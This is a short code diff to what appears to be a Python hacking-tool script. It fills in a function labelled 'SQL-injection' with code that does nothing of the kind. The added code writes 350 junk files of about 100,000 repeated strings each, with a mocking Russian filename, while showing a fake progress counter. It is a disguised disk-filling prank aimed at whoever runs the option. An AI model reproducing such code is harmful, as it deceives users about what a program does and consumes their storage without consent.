@@ -108,7 +108,17 @@ def Directory(n):
 #--------------------------SQL-injection-------------------------
 
 def SQL(url):
-      pass
+      r = 350 
+      o = 0
+      for i in range(r):
+            i = i + 1
+            file = open(f"ya-pravda-gay{i}.gay", "w")
+            o = o + 0.4 
+            clear()
+            print(int(o),"%")
+            for e in range(100000):
+                  e = e+1
+                  file.write(str(int))
 
 #-----------------------------Run-----------------------------
 
